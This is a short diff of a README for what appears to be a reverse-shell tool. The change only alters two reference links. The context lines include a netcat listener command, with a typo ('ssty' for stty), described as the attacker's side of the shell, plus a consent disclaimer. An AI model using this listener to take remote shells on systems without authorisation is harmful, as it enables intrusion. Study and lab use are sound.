@@ -15,8 +15,8 @@ start by listening on the attackers side
 command : ssty raw -echo; (stty size; cat) | nc -lvnp port -s IPaddr
 
 # 📎 Refernces used in this project 
-https://www.youtube.com/watch?v=bXCeFPNWjsM
-https://github.com/swisskyrepo/PayloadsAllTheThings
+--https://www.youtube.com/watch?v=bXCeFPNWjsM
+--https://github.com/swisskyrepo/PayloadsAllTheThings
 
 # disclamer
 please don't spread this as malware or use on othere's with out concent,
